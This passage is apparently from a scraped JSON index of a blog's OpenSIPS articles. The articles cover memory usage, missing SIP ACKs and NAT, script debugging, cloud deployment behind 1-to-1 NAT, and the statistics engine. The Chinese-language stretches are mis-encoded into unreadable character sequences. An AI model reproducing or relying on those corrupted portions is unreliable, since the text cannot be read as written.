ç”¨çš„å†…å­˜æ‰ä¼šé‡Šæ”¾ï¼Œè€Œåœ¨æ­¤ä¹‹å‰ï¼Œè€çš„æ•°æ®ä»æ—§é©»ç•™åœ¨å†…å­˜ä¸­ï¼Œç”¨æ¥å¤„ç†å‘¼å«ã€‚æ‰€ä»¥åœ¨æ¨¡å—reloadçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯å¾€å¾€å†…å­˜å‡ºç°å³°å€¼çš„æ—¶å€™ã€‚ è€çš„æ•°æ®è¢«é‡Šæ”¾ä¹‹åï¼Œå³°å€¼ä¼šå¾ˆå¿«å›è½ã€‚\nEven though dialogs become significantly less, shared memory usage is still high. That is because dialogs are not immediately deleted fromÂ OpenSIPSÂ memory, but on a timer job that deletes them in bulk batches from the database(increased DB performance). Also, SIP transactions are not deleted immediately after they complete, but stored for a while to absorb re-transmissions (according to RFC 3261 requirements). Even if there are no high amounts of dialogs coming in, there is a big spike of memory usage, which also changes theÂ max_used_sizeÂ statistic. The reason for this spike is aÂ droutingÂ module cache reload, over the MI (Management Interface): opensipsctl fifo dr_reload The reason for this spike is that during cache reload,Â OpenSIPSÂ stores in memory two sets of data: the old one and the new one. The old setÂ is used to route calls until the new set is fully loaded. After that, the memory for the old set is released, and the new set is used further on. Although this algorithm is used to increase the routing performance, it requires a large amount of memory during reload, usually doubling the memory used for provisioning.Following the article till now, you would say that looking at the memory statistics and correlating traffic with memory usage can be fairly easy to understand howÂ OpenSIPS**Â **uses memory and what are the components that use more. Unfortunately that is not always true, because sometime you might not have the entire history of the events, or the events happen simultaneously, and you can not figure out why. Therefore you might end up in a situation where you are using large amount of memory, but can point out why. This makes scaling rather impossible (for both customers and provisioning rules), because you will not be able to estimate how components spread the memory amongÂ them. That is why inÂ OpenSIPSÂ 2.2Â we added a more granular memory support, that allows you to view the memory used by each module (or group of modules).Â Memory usage in OpenSIPS 2.2 In order to enable granular memory support, you need to follow these steps:\ngenerate statistics files by running: # make generate-mem-stats 2\u0026gt; /dev/null compileÂ OpenSIPSÂ with extra shared memory support, by running: # make menuconfig -\u0026gt; Configure compile options -\u0026gt;Â \u0026lt;br /\u0026gt;Â Configure compile flags -\u0026gt; SHM_EXTRA_STATS\u0026lt;br /\u0026gt;# make all configure the groups inÂ OpenSIPSÂ configuration file: mem-group = \u0026#34;traffic\u0026#34;: \u0026#34;tm\u0026#34; \u0026#34;dialog\u0026#34; mem-group = \u0026#34;provision\u0026#34;: \u0026#34;drouting\u0026#34; restartÂ OpenSIPSÂ and follow the steps from the previous sections. Checking the statistics during peak time you will get something like this:\n# opensipsctl fifo get_statistics shmem_group_traffic: shmem_group_provision: shmem_group_traffic:fragments:: 153618 shmem_group_traffic:memory_used:: 85448608 shmem_group_traffic:real_used:: 86677612 shmem_group_provision:fragments:: 245614 shmem_group_provision:memory_used:: 53217232 shmem_group_provision:real_used:: 55182144 Checking theÂ trafficÂ statistics will show you exactly how much memoryÂ OpenSIPSÂ uses for calls, while checking theÂ provisionÂ statistics will show you the memory used by theÂ droutingÂ module. The rest of memory is used by other other modules or by the core. If you want to track those down too, group them in a newÂ mem-group.**\nDimensioning OpenSIPS memory As you have noticed throughout this article, dimensioningÂ OpenSIPSÂ for a specific number of clients or provisioning data is not an easy task and requires a deep understanding of both customer traffic patterns and provisioning data, as well asÂ OpenSIPSÂ internals. We hope that using the tips provided in this article will help you have a better understanding of your platform, how memory resourcesÂ are used byÂ OpenSIPS, and how to dimensionÂ your VoIP platform to the desired scale.\n","permalink":"https://wdd.js.org/opensips/blog/memory-usage/","summary":"åŸæ–‡ï¼šhttps://blog.opensips.org/2016/12/29/understanding-and-dimensioning-memory-in-opensips/\nRunning OpenSIPS with the right memory configuration is a very important task when developing and maintaining your VoIP service, because it has a direct effect over the scale of your platform, the customers you support, as well as the services you offer. Setting the limit to a low value might make OpenSIPS run out of memory during high volume of traffic, or during complex scenarios, while setting a big value might lead to wasted resources.","title":"ç†è§£å¹¶æµ‹é‡OpenSIPSçš„å†…å­˜èµ„æº"},{"content":"We all experienced calls getting self disconnected after 5-10 seconds â€“ usually disconnected by the callee side via aÂ BYEÂ request â€“ but aÂ BYEÂ which was not triggered by the party behind the phone, but by the SIP stack/layer itself.This is one of the most common issues we get in SIP and one of the most annoying in the same time. But why it happens ?\nGetting to the missing ACK Such a decision to auto-terminate the call (beyond the end-user will and control) indicates an error in the SIP call setup. And because the call was somehow partially established (as both end-points were able to exchange media), we need to focus on the signalling that takes place after theÂ 200 OKÂ reply (when the call is accepted by the callee). So, what do we have between theÂ 200 OKÂ reply and the full call setup ? Well, it is theÂ ACKÂ requests â€“ the caller acknowledgement for the receivedÂ 200 OK.And according to theÂ RFC3261, any SIP device not receiving theÂ ACKÂ to its finalÂ 2xxÂ reply has to disconnect the call by issuing a standardÂ BYEÂ request.So, whenever you experience such 10 seconds disconnected calls, first thing to do is to do a SIP capture/trace and to check if the callee end-device is actually getting anÂ ACK. It is very, very import to check forÂ ACKÂ at the level of the callee end-device, and not at the level of caller of intermediary SIP proxies â€“ theÂ ACKÂ may get lost anywhere on the path from caller to callee.\nTracing the lost ACK In order to understand how and where theÂ ACKÂ gets lost, we need first to understand how theÂ ACKÂ is routed from caller to the calleeâ€™s end-device. Without getting into all the details, theÂ ACKÂ is routed back to callee based on theÂ Record-RouteÂ andÂ ContactÂ headers received into theÂ 200 OKÂ reply. So, if theÂ ACKÂ is mis-routed, it is mainly because of wrong information in theÂ 2oo OK.TheÂ Record-RouteÂ headers (in theÂ 200 OK) are less to blame, as they are inserted by the visited proxies and not changed by anyone else. Assuming that you do not have some really special scenarios with SIP proxies behind NATs, we can simply discard the possibility of having faultyÂ Record-Routes.So, the primary suspect is theÂ ContactÂ header in theÂ 200 OKÂ â€“ this header is inserted by the calleeâ€™s end-device and it can be altered by any proxy in the middle â€“ so there are any many opportunities to get corrupted. And this mainly happens due to wrong handling of NAT presence on end-user side â€“ yes, thatâ€™s it, a NATed callee device.\nCommon scenarios No NATÂ handling If the proxy does not properly handle NATed callee device, it will propagate into theÂ _200 OK_reply the private IP of the callee. And of course, this IP will be unusable when comes to routing back theÂ ACKÂ to the callee â€“ the proxy will have the â€œimpossibleâ€ mission to route to a private IP :). So, theÂ ACKÂ will get lost and call will get disconnected.\nIf the case, withÂ OpenSIPS, you will have to review your logic in theÂ onreplyÂ route and performÂ fix_nated_contact()Â for theÂ 200 OK, if callee is known as NATed.\nThe correct handling and flow has to be like this:\nExcessive NAT handling While handling NATed end-points is good, you have to be careful not to over do it. If you see a private IP in theÂ ContactÂ header you should not automatically replace it with the source IP of the SIP packet. Or you should not do it for any incoming reply (like â€œletâ€™s do it all the time, just to be sureâ€).\nIn a more complex scenarios where a call may visit multiple SIP proxies, the proxies may loose valuable routing information by doing excessive NAT traversal handling. Like in the scenario below, ProxyA is over doing it, by applying the NAT traversal logic also for calls coming from a proxy (ProxyB) and not only for replies coming from an end-point. By doing this, the IP coordinates of the callee will be lost fromÂ ContactÂ header, as ProxyA has no direct visibility to callee (in terms of IP).\nIn such a case, with OpenSIPS, you will have to review your logic in theÂ onreplyÂ route and to be sure you performÂ fix_nated_contact()Â for theÂ 200 OKÂ only if the reply comes from an end-point and not from another proxy.\nConclusions SIP is complicated and you have to pay attention to all the details, if you want to get it to work. Focusing only on routing theÂ INVITEÂ requests is not sufficient.If you come across disconnected calls:\nget a SIP capture/trace and see if theÂ ACKÂ gets to the callee end-point if not, check theÂ ContactÂ header in theÂ 200 OKÂ â€“ it must point all the time to the callee end-point (a public IP) if not, check the NAT traversal logic you have in theÂ onreplyÂ routes â€“ be sure you do theÂ ContactÂ fixingÂ onlyÂ when it is needed. Shortly, be moderate, not too few and not too much â€¦when comes to NAT handlingÂ ","permalink":"https://wdd.js.org/opensips/blog/miss-ack/","summary":"We all experienced calls getting self disconnected after 5-10 seconds â€“ usually disconnected by the callee side via aÂ BYEÂ request â€“ but aÂ BYEÂ which was not triggered by the party behind the phone, but by the SIP stack/layer itself.This is one of the most common issues we get in SIP and one of the most annoying in the same time. But why it happens ?\nGetting to the missing ACK Such a decision to auto-terminate the call (beyond the end-user will and control) indicates an error in the SIP call setup.","title":"Troubleshooting missing ACK in SIP"},{"content":"What makes OpenSIPS such an attractive and powerful SIP solutions is its high level of programmability, thanks to its C-like configuration script. But once you get into the â€œprogrammingâ€ area, you will automatically need tools and skills for troubleshooting.So here there are some some tips and tools you can use in OpenSIPS for â€œdebuggingâ€ your configuration script.\nControlling the script logging The easiest way to troubleshoot your script is of course by using theÂ xlog()Â core function and print your own messages. Still the internal OpenSIPS logs (generated by the OpenSIPS code) do provide a lot of information about what OpenSIPS is doing.The challenge with the logging is to control the amount and content of messages you want to log. Otherwise you will end up with huge piles of logs, completely impossible to read and follow.By using theÂ $log_levelÂ script variable you can dynamically change the logging level (to make it more or less verbose) from the script level. You can do this only for parts of the script:\nlog_level= -1 # errors only â€¦.. { â€¦â€¦ $log_level = 4; # set the debug level of the current process to DEBUG uac_replace_from(â€¦.); $log_level = NULL; # reset the log level of the current process to its default level â€¦â€¦. }\nor only for certain messages, based on source IP (you can use theÂ permissionsÂ module for a more dynamic approach, controlled via DB)\nif ($si==â€11.22.33.44â€³) $log_level = 4;\nor some parts of the message (you can use theÂ dialplanÂ module for the dynamic approach):\nif ($rU==â€911â€³) $log_level = 4;\nIMPORTANT: do not forget to reset the log level back to default before terminating the script, otherwise that log level will be used by the current process for all the future messages it will handle.\nTracing the script execution Still, using theÂ xlog()Â core function may not be the best option as it implies a high script pollution and many script changes (with restarts, of course).So, a better alternative is theÂ script_trace()Â core function. Once you enabled the script tracing, OpenSIPS will start logging its steps though the script execution, printing each function that is called and its line in the script file.This script tracing is really helpful when you want to understand or troubleshoot your script execution, answering questions like â€œwhy does my script not get to this routeâ€ or â€œwhy is the script function not calledâ€ or â€œI do not understand how the SIP message flows through my scriptâ€œâ€¦.. and many other similar problems.TheÂ script_trace()Â function can help even more by allowing you to trace the value of certain variables (or parts of the message) during the script execution. Like â€œI do not understand where in script my RURI is changedâ€œ. So you simply attach to the function a log line (with variables, of course) that will be evaluated and printed for each function in the script:\nscript_trace( 1, â€œ$rm from $si, ruri=$ruâ€, â€œmeâ€);\nwill produce:\n[line 578][me][module consume_credentials] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:111211@opensips.org) [line 581][me][core setsflag] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:111211@opensips.org) [line 583][me][assign equal] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:111211@opensips.org) [line 592][me][core if] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 585][me][module is_avp_set] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 589][me][core if] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 586][me][module is_method] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org) [line 587][me][module trace_dialog] -\u0026gt; (INVITE 127.0.0.1 , ruri=sip:tester@opensips.org) [line 590][me][core setflag] -\u0026gt; (INVITE from 127.0.0.1 , ruri=sip:tester@opensips.org)\nAgain, you can enable the script tracing only for some cases (on demand). For example I want to trace only calls from a certain subscriber, so I can use theÂ dialplanÂ module and create in DB rules to match the subscribers Iâ€™m interested in tracing:\nif ( dp_translate(â€œ1â€³,â€$fU/$var(foo)â€) )\ncaller must be traced according to dialplan 1 script_trace( 1, â€œ$rm from $si, ruri=$ruâ€, â€œmeâ€);\nBenchmarking the script Assuming that you get to a point where you managed to troubleshoot and fix your script in terms of the execution flow, you now may be interested in troubleshoot the script execution from the time perspective â€“ how much time takes OpenSIPS to execute certain parts of the script.This is a mandatory step if you want to perform a performance analysis of your OpenSIPS setup.TheÂ benchmarkÂ module will help you to measure the time OpenSIPS took to execute different parts of the script:\nbm_start_timer(â€œlookup-timerâ€); lookup(â€œlocationâ€); bm_log_timer(â€œlookup-timerâ€);\nAn interesting capability of the module is to provide information about the current usage, but also aggregated information from the past, like how many times a certain timer was used or what was the total time spent in a timer (see the full providedÂ information). And even more, such information can be pulled via Management Interface via theÂ bm_poll_resultsÂ command, for external usage:\nopensipsctl fifo bm_poll_results register-timer 3/40/12/14/13.333333 9/204/12/97/22.666667 lookup-timer 3/21/7/7/7.000000 9/98/7/41/10.888889\nIdentifying script bottlenecks But still you need to find the weak points of your script in terms on time to process. Or the bottlenecks of your script.OpenSIPS provides a very useful mechanism for this â€“ theÂ time thresholds. There are different thresholds, for different operations, that can be set in OpenSIPS core and modules. Whenever the execution takes longer than configured, OpenSIPS will report it to the log, together with additional useful information (such as operation details or script backtrace):\nexec_msg_thresholdÂ (core) â€“ the maximum number of microseconds the processing of a SIP msg is expected to last. This is very useful to identify the â€œslowâ€ functions in your overall script; exec_dns_thresholdÂ (core) â€“ the maximum number of microseconds a DNS query is expected to last. This is very useful to identify what are the â€œslowâ€ DNS queries in your routing (covering also SRV, NAPTR queries too);** tcp_thresholdÂ (core) â€“ maximum number of microseconds sending a TCP request is expected to last. This is useful to identify the â€œslowâ€ TCP connections (in terms of sending data). Note that this option will cover all TCP-based transports, like TCP plain, TLS, WS, WSS, BIN or HEP. exec_query_thresholdÂ (db_mysql module) â€“ maximum number of microseconds for running a mysql query. This is useful to identify the â€œslowâ€ query you may have. Note that this option covers all the mysql queries you may have in OpenSIPS â€“ from script level or internally triggered by modules. A similar option is also in theÂ db_postgresÂ module too. An example for the output trigger by theÂ exec_msg_thresholdÂ :\nopensips[17835]: WARNING:core:log_expiry: threshold exceeded : msg processing took too long â€“ 223788 us.Source : BYE sip:â€¦â€¦â€¦. opensips[17835]: WARNING:core:log_expiry: #1 is a module action : match_dialog â€“ 220329us â€“ line 1146 opensips[17835]: WARNING:core:log_expiry: #2 is a module action : t_relay â€“ 3370us â€“ line 1574 opensips[17835]: WARNING:core:log_expiry: #3 is a module action : unforce_rtp_proxy â€“ 3297us â€“ line 1625 opensips[17835]: WARNING:core:log_expiry: #4 is a core action : 78 â€“ 24us â€“ line 1188 opensips[17835]: WARNING:core:log_expiry: #5 is a module action : subst_uri â€“ 8us â€“ line 1201\nGood luck with the troubleshootingÂ and be sureÂ your OpenSIPS rocksÂ !!\n","permalink":"https://wdd.js.org/opensips/blog/troubleshooting-opensips-script/","summary":"What makes OpenSIPS such an attractive and powerful SIP solutions is its high level of programmability, thanks to its C-like configuration script. But once you get into the â€œprogrammingâ€ area, you will automatically need tools and skills for troubleshooting.So here there are some some tips and tools you can use in OpenSIPS for â€œdebuggingâ€ your configuration script.\nControlling the script logging The easiest way to troubleshoot your script is of course by using theÂ xlog()Â core function and print your own messages.","title":"Troubleshooting OpenSIPS script"},{"content":"Cloud computing is a more and more viable option for running and providing SIP services. The question is how compatible are the SIP services with the Cloud environment ? So letâ€™s have a look at this compatibility from the most sensitive (for SIP protocol) perspective â€“ the IP network topology.A large number of existing clouds (likeÂ EC2,Â Google CP,Â Azure) have a particularity when comes to the topology of the IP network they provide â€“ they do not provide public routable IPs directly on the virtual servers, rather they provide private IPs for the servers and a fronting public IP doing aÂ 1-to-1 NATÂ to the private one.Such a network topology forces you to run the SIP service behind a NAT. Why is this such a bad thing? Because, unlike other protocols (such as HTTP), SIP is very intimate with the IP addresses â€“ the IPs are part of the SIP messages and used for routing. So, a SIP server running on a private IP advertises its listening IP address (the private one) in the SIP traffic â€“ this will completely break the SIP routing, both at transaction and dialog level :\ntransaction levelÂ â€“ when sending a SIP request, the SIP server will construct the Via SIP header using its listening IP, so the private IP. But the information from the Via header is used by the receiver of the SIP request in order to route back the SIP replies. But routing to a private IP (from the public Internet) is mission impossible; dialog levelÂ â€“ in a similar way, when sending an INVITE request, the SIP server will advertise in its Contact SIP header the private IP, so other SIP party will not be able to send any sequential request back to our server. So, how canÂ OpenSIPSÂ help you to run SIP services in the Cloud ?\nRunning OpenSIPS behind NAT OpenSIPSÂ implements a smart mechanism of separating the IPs used at network level (as listeners) and the IPs inside the SIP messages.TheÂ â€œadvertiseâ€Â mechanism gives you full control of what IP is presented (or advertised) in the SIP messages, despite what IP is used for the networking communication. Shortly you can haveÂ OpenSIPSÂ sending a SIP request from theÂ 10.0.0.15Â private IP address, but using for inside the message (as Via, Contact or Route) a totally different IP.When advertising a different IPÂ (than the network layer), the following parts of the SIP message will be affected:\nthe introducedÂ ViaÂ header (if a SIP request) the introducedÂ Record-RouteÂ header (if a SIP request) the introducedÂ ContactÂ header OpenSIPSÂ has a a very flexible way to control the advertised IP, at different levels: global, per listening interface or per SIP transaction\nGlobal Advertising Such advertising will affect the entire traffic handled byÂ OpenSIPS, automatically, without any additional action in the actual routing script. This setting is achieved via theÂ advertised_addressglobal parameter:advertised_address=\u0026ldquo;12.34.56.78\u0026rdquo;\nPer Interface Advertising For more complex scenarios when using multiple listening interfaces, you can opt for different advertised IP for each listener. Some listener may be bound to the NATed IP address, so you want to do advertising, some other listener may be bound to a private IP used only inside the private network, so you want no advertising.listen = udp:10.0.0.34:5060 as 99.88.44.33:5060listen = udp:10.0.0.36:5060All the SIP traffic routing through such an advertising interface will be automatically modified. The only thing you have to do is to be sure you properly control the usage of interfaces when you route your SIP traffic â€“ usually switching to a different interface, by using theÂ force_send_socket()Â script function.\nPer Transaction Advertising The finest granularityÂ OpenSIPSÂ offers for controlling the advertising IP is at SIP transaction level â€“ that is, for each transaction (a SIP requests and all its replies) you can choose what should be the advertised IP.Such control is done at via the routing script â€“ when routing the SIP requests, you can enforce a value to be advertise for its transactionset_advertised_address( 12.34.56.78 );As aÂ small but important noteÂ : advertising a different IP identity may act as a boomerang â€“ your OpenSIPS may be required to recognize itself based on IP you previously advertised. Like the IP advertised in an INVITE request in the Record-Route header must be recognized by OpenSIPS as â€œits own IPâ€ later, when receiving a sequential request like ACK or BYE and inspecting the Route header.If for the global and per-interface advertising OpenSIPS is automatically able to recognize its own advertised IPâ€™s, for the per-transaction level it cannot not. So you have to explicitly take care of that and teach OpenSIPS about the IPâ€™s you plan to advertise by using theÂ aliasÂ core parameter.\nRunning RTPproxy behind NAT So far we covered the OpenSIPS related part. But in many SIP scenarios you may be required to handle the media/RTP too, for cases like call recording, media pinning, DTMF sniffing or other.So, you may end up with the need of running RTPproxy behind an 1-to-1 NAT. Fortunately things are much more simple here. The nature of the 1-to-1 NAT takes care of the port mapping between the public NAT IP and the private IP. The only thing you have to do is to advertise the public IP in the SIP SDP, while keeping RTPproxy to operate on the private IP.To get this done, when using one of the RTPproxy related functions likeÂ rtpproxy_engage(),Â rtpproxy_answer()Â orÂ rtpproxy_offer(), simply use the second parameter of these function to overwrite (in the SDP) the IP received from RTPproxy with the IP you want to advertise:rtpproxy_engage(\u0026ldquo;co\u0026rdquo;,\u0026ldquo;23.45.67.89\u0026rdquo;);This will result in having the 23.45.67.89 IP advertised in the SDP, rather than the IP RTPproxy is running on. And no other change is required in the actual RTPproxy configuration.\nWhatâ€™s next ? What we covered so far here is a relatively simple scenario, still it is the mostly used one â€“ an OpenSIPS behind NAT serving SIP client on the public Internet.But things are getting more complicated and interesting when you also want to offer media services (like voicemail) or you want to support SIP clients from both public and private networks â€“ and these are the topics for some future posts on this matter.\n","permalink":"https://wdd.js.org/opensips/blog/runing-opensips-in-cloud/","summary":"Cloud computing is a more and more viable option for running and providing SIP services. The question is how compatible are the SIP services with the Cloud environment ? So letâ€™s have a look at this compatibility from the most sensitive (for SIP protocol) perspective â€“ the IP network topology.A large number of existing clouds (likeÂ EC2,Â Google CP,Â Azure) have a particularity when comes to the topology of the IP network they provide â€“ they do not provide public routable IPs directly on the virtual servers, rather they provide private IPs for the servers and a fronting public IP doing aÂ 1-to-1 NATÂ to the private one.","title":"Running OpenSIPS in the Cloud"},{"content":"æ— è®ºä½ æ˜¯ç»éªŒä¸°å¯Œçš„OpenSIPSç®¡ç†å‘˜ï¼Œæˆ–è€…ä½ ä»…ä»…æƒ³æ‰¾åˆ°ä¸ºä»€ä¹ˆACKæ¶ˆæ¯åœ¨ä½ çš„ç½‘ç»œä¸­å¾ªç¯å‘é€ï¼Œå”¯ä¸€å¯ä»¥ç¡®å®šçš„æ˜¯ï¼šæˆ‘ä»¬æˆ–æ—©æˆ–æ™šä¼šéœ€è¦OpenSIPSæä¾›æ•°æ®æ¥å›ç­”ä»¥ä¸‹é—®é¢˜\nOpenSIPSè¿è¡Œäº†å¤šä¹…ï¼Ÿ æˆ‘ä»¬æ˜¯å¦è¢«æ¶æ„æµé‡æ”»å‡»äº†ï¼Ÿ æˆ‘ä»¬çš„å¹³å°å¤„ç†äº†å¤šå°‘ä¸ªæ¥è‡ªè¿è¥å•†çš„æ— æ•ˆSIPåŒ… åœ¨æµé‡å³°å€¼æ—¶ï¼ŒOpenSIPSæ˜¯å¦æ‹¥æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥æ”¯æ’‘è¿è¡Œ \u0026hellip; å¹¸è¿çš„æ˜¯ï¼ŒOpenSIPSæä¾›å†…ç½®çš„ç»Ÿè®¡æ”¯æŒï¼Œæ¥æ–¹ä¾¿æˆ‘ä»¬å¿«é€Ÿè§£å†³ä»¥ä¸Šé—®é¢˜ã€‚è¯¦æƒ…å¯ä»¥æŸ¥çœ‹OpenSIPSç»Ÿè®¡æ¥å£ã€‚åœ¨æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†ä¼šäº†è§£ç»Ÿè®¡å¼•æ“ï¼Œä½†æ˜¯ï¼Œä»€ä¹ˆæ˜¯å¼•æ“ï¼Ÿ\nç»Ÿè®¡å¼•æ“ æ€»çš„æ¥è¯´ï¼Œä¸‹å›¾å°±æ˜¯OpenSIPSå¼•æ“çš„æ ·å­ã€‚\nç»Ÿè®¡å¼•æ“å†…ç½®äºOpenSIPSã€‚å®ƒç®¡ç†æ‰€æœ‰çš„ç»Ÿè®¡æ•°æ®ï¼Œå¹¶ä¸”æš´éœ²ä¸€ä¸ªæ ‡å‡†çš„CRUDæ“ä½œæ¥å£ç»™æ‰€æœ‰çš„æ¨¡å—ï¼Œè®©æ¨¡å—å¯ä»¥æ¨é€æˆ–è€…ç®¡ç†ä»–ä»¬è‡ªå·±çš„ç»Ÿè®¡æ•°æ®ã€‚\nä¸€ä¸‹æœ‰ä¸‰ç§æ–¹å¼æ¥å’Œç»Ÿè®¡å¼•æ“è¿›è¡Œäº¤äº’\nç›´æ¥é€šè¿‡è„šæœ¬è®¿é—®ã€‚å¦‚é€šè¿‡$script(my-stat)å˜é‡ ä½¿ç”¨HTTPè¯·æ±‚æ¥è®¿é—® ä½¿ç”¨opensipsctl fifoå‘½ä»¤ ç»Ÿè®¡å¼•æ“æ˜¯éå¸¸çµæ´»å¹¶ä¸”å¯ä»¥é€šè¿‡ä¸åŒæ–¹å¼ä¸å…¶äº¤äº’ï¼Œé‚£ä¹ˆå®ƒæ€ä¹ˆèƒ½è®©æˆ‘ä»¬çš„ä½¿ç”¨å˜å¾—æ–¹ä¾¿å‘¢ï¼Ÿä¸‹é¢çš„ä¸€äº›å»ºè®®ï¼Œèƒ½å¤Ÿè®©ä½ å…¨é¢çš„å‘æŒ¥é™æ€ç»Ÿè®¡å¼•æ“çš„èƒ½åŠ›ï¼Œæ¥å¢å¼ºæŸäº›é‡è¦çš„å±‚é¢ã€‚\nç³»ç»Ÿå¼€å‘ç»´æŠ¤ å½“ä½ å¤„ç†OpenSIPSçš„DevOpsæ—¶ï¼Œä½ ç»å¸¸éœ€è¦ç›‘æ§OpenSIPSçš„ä¸€äº›è¿è¡Œå‚æ•°ã€‚ä½ çš„å…³æ³¨ç‚¹ä¸åŒï¼Œé‚£ä¹ˆä½ å°±éœ€è¦ç›‘æ§ä¸åŒçš„æ–¹é¢ï¼Œä¾‹å¦‚SIPäº‹åŠ¡ã€å¯¹è¯ã€å†…å­˜ä½¿ç”¨ã€ç³»ç»Ÿè´Ÿè½½ç­‰ç­‰\nä¸‹é¢æ˜¯OpenSIPSç»Ÿè®¡åˆ†ç»„çš„ä¸€ä¸ªæ¦‚è¦ï¼Œä»¥åŠç»„å†…çš„æ¯ä¸€ä¸ªç»Ÿè®¡å€¼ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒwikiã€‚\nç»Ÿè®¡ç®€ä»‹ å‡å¦‚æˆ‘ä»¬æƒ³é€šè¿‡sippå¯¹æˆ‘ä»¬çš„å¹³å°è¿›è¡Œæµé‡æµ‹è¯•ï¼Œæˆ‘ä»¬æƒ³å‹æµ‹æœŸé—´è§‚æµ‹å½“å‰çš„äº‹åŠ¡ã€å¯¹è¯ã€å…±äº«å†…å­˜çš„å€¼å˜åŒ–ã€‚æˆ–è€…æˆ‘ä»¬æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªæ–°çš„SIPæä¾›å•†ï¼Œä»–ä»¬æ¯å¤©æ—©ä¸Š9ç‚¹ä¼šå¼€å§‹å‘æˆ‘ä»¬å¹³å°æ¨é€æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦ç›‘æ§ä»–ä»¬çš„æ¨é€ä¼šå¯¹æˆ‘ä»¬ç³»ç»Ÿäº§ç”Ÿçš„å½±å“ã€‚\nä½ å¯ä»¥åœ¨OpenSIPSå®ä¾‹ä¸­è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š\nwatch -n0.2 \u0026#39;opensipsctl fifo get_statistics inuse_transactions dialog: shmem:\u0026#39; æ³¨æ„ get_statisticså‘½ä»¤å³å¯ä»¥æ¥å—ä¸€ä¸ªç»Ÿè®¡å€¼é¡¹ï¼Œä¹Ÿå¯ä»¥æ¥å—ä¸€ä¸ªç»Ÿè®¡ç»„çš„é¡¹ã€‚ç»Ÿè®¡ç»„éƒ½æ˜¯ä»¥å†’å·(:)ç»“å°¾ã€‚\nä¸é€’å¢çš„ç»Ÿè®¡æŒ‡æ ‡è¿›è¡Œäº¤äº’ ç»Ÿè®¡æŒ‡æ ‡çœ‹èµ·æ¥ç›¸åŒï¼Œå®é™…ä¸Šåˆ†ä¸ºä¸¤ç±»\nç´¯è®¡å€¼ã€‚ç´¯è®¡æ˜¯ä¸€èˆ¬æ˜¯éšç€æ—¶é—´å¢é•¿ï¼Œä¾‹å¦‚rcv_requests, processed_dialogsï¼Œè¡¨ç¤ºä»æŸä¸ªæ—¶é—´ç‚¹å¼€å§‹ç´¯è®¡æ”¶åˆ°æˆ–è€…å¤„ç†äº†å¤šå°‘ä¸ªä»»åŠ¡ è®¡ç®—å€¼ã€‚è®¡ç®—å€¼ä¸€èˆ¬å’Œç³»ç»Ÿè¿è¡Œè´Ÿè½½æœ‰å…³ï¼Œå’Œæ—¶é—´æ— å…³ã€‚ä¾‹å¦‚active_dialogs, real_used_size, è¿™äº›å€¼éƒ½æ˜¯ç”±å†…éƒ¨å‡½æ•°è®¡ç®—å‡ºæ¥çš„è®¡ç®—å€¼ ä¸€èˆ¬æ¥è¯´ï¼Œè„šæœ¬ä¸­å®šä¹‰çš„ç»Ÿè®¡å€¼éƒ½æ˜¯é€’å¢çš„ï¼ŒOpenSIPSæ— æ³•é‡æ–°è®¡ç®—å®ƒï¼Œåªèƒ½æˆ‘ä»¬è‡ªå·±æ¥è®¡ç®—æˆ–è€…ç»´æŠ¤å®ƒçš„å€¼ã€‚\nä»¥ä¸‹æ–¹å¼å¯ä»¥å¿«é€ŸæŸ¥çœ‹è®¡ç®—å€¼ç±»çš„ç»Ÿè®¡é¡¹\nopensipsctl fifo list_statistics æŸäº›åœºæ™¯ï¼Œä½ å¯èƒ½éœ€è¦å‘¨æœŸæ€§çš„é‡ç½®ç´¯è®¡å€¼ç±»çš„ç»Ÿè®¡é¡¹ã€‚ä¾‹å¦‚ä½ å¯ä»¥åªéœ€è¦ç»Ÿè®¡å½“å¤©çš„processed_dialogsï¼Œdaily_routed_minutesï¼Œé‚£ä¹ˆä½ åªéœ€è¦è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯å¤©0ç‚¹ï¼Œé‡ç½®è¿™äº›ç»Ÿè®¡å€¼ã€‚\nopensipsctl fifo reset_statistics processed_dialogs åœ¨è„šæœ¬ä¸­è‡ªå®šä¹‰ç»Ÿè®¡é¡¹ åœ¨è„šæœ¬ä¸­è‡ªå®šä¹‰ç»Ÿè®¡é¡¹æ˜¯éå¸¸ç®€å•çš„ï¼Œåªéœ€è¦åšä¸¤æ­¥\nåŠ è½½statistics.soæ¨¡å— åœ¨æŸäº›ä½ç½®è°ƒç”¨å‡½æ•°, update_stat(\u0026quot;daily_routed_minutes\u0026quot;, \u0026quot;+1\u0026quot;) å®æˆ˜ï¼šè„šæœ¬ä¸­æœ‰è®¸å¤šçš„è‡ªå®šä¹‰ç»Ÿè®¡é¡¹ ç»Ÿè®¡æ¯å¤©æ”¶åˆ°çš„SIPæ¶ˆæ¯çš„è¯·æ±‚æ–¹å¼, ä»¥åŠå¤„ç†çš„æ¶ˆæ¯é•¿åº¦ æ¯éš”24å°æ—¶ï¼Œä»¥JSONçš„å½¢å¼ï¼Œå°†æ¶ˆæ¯å†™åˆ°SIPæœåŠ¡å™¨ # è®¾ç½®ç»Ÿè®¡ç»„ modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_groups\u0026#34;, \u0026#34;method, packet\u0026#34;) # è¯·æ±‚è·¯ç”± route { ... update_stat(\u0026#34;method:$rm\u0026#34;, \u0026#34;+1\u0026#34;); update_stat(\u0026#34;packet:count\u0026#34;, \u0026#34;+1\u0026#34;); update_stat(\u0026#34;packet:total_size\u0026#34;, \u0026#34;$ml\u0026#34;) # message length ... } # å“åº”è·¯ç”± onreply_route { update_stat(\u0026#34;packet:count\u0026#34;, \u0026#34;+1\u0026#34;); 